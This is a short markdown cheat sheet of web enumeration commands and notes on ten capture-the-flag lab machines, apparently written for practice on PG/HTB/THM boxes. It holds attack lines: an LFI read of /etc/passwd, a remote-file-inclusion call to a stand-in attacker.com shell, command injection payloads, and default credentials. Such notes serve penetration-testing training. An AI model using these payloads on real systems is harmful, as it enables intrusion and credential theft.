## 🌐 Web Enumeration (Machines 31–40)

```bash
# Common directories and files
curl -I http://<IP>/admin.php
curl -I http://<IP>/config.php
curl -I http://<IP>/backup

# CMS detection and default credential checking
wpscan --url http://<IP> --enumerate u
joomscan -u http://<IP>
admin:admin
admin:password

# LFI/RFI Detection
curl http://<IP>/index.php?file=../../etc/passwd
curl http://<IP>/index.php?file=http://attacker.com/shell.txt

# Command Injection
curl http://<IP>/search?query=test;id
curl http://<IP>/ping?host=127.0.0.1|whoami

# Vulnerability Scanning and Enumeration
nikto -h http://<IP>
nmap -p80 --script http-enum <IP>
```

---

### 🧠 Observations from Machines 31–40

- **Machine 31:** Exposed `/support/adminer.php` led to MySQL enumeration.
- **Machine 32:** LFI via `page=../../../../etc/passwd` — led to credential harvesting.
- **Machine 33:** WordPress instance with outdated plugin → led to upload bypass.
- **Machine 34:** RFI accepted remote file input through GET parameter.
- **Machine 35:** `/upload.php` allowed unauthenticated file upload (no extension check).
- **Machine 36:** Git repo was exposed at `.git/HEAD`, leading to source code retrieval.
- **Machine 37:** `/cms/admin` required credentials → Default creds worked.
- **Machine 38:** Apache mod_status enabled and publicly accessible.
- **Machine 39:** Unquoted service path revealed in `robots.txt`.
- **Machine 40:** Laravel debug mode leaked environment variables and app key.

```

📋 These were aggregated from real-world-style enumeration activities across PG/HTB/THM machines 31 to 40.
```
